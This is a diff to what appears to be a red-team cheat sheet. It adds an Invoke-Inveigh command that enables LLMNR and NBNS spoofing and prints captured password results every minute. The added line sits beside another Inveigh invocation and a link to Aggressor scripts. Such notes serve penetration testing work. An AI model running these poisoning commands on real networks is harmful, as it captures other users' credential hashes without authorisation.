@@ -257,6 +257,8 @@ Overpass the Hash
 
 Inveigh
   Import Inveigh Powershell Script
+  Invoke-Inveigh -LLMNR Y -NBNS Y -DNS N -HTTP N -StatusOutput Y -ConsoleOutput Y -ConsoleStatus 1
+    - prints PW results every 1 minute
   Invoke-Inveigh -ConsoleOutput N -RunTime 30 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y
   * Agressor script: https://github.com/Und3rf10w/Aggressor-scripts
   
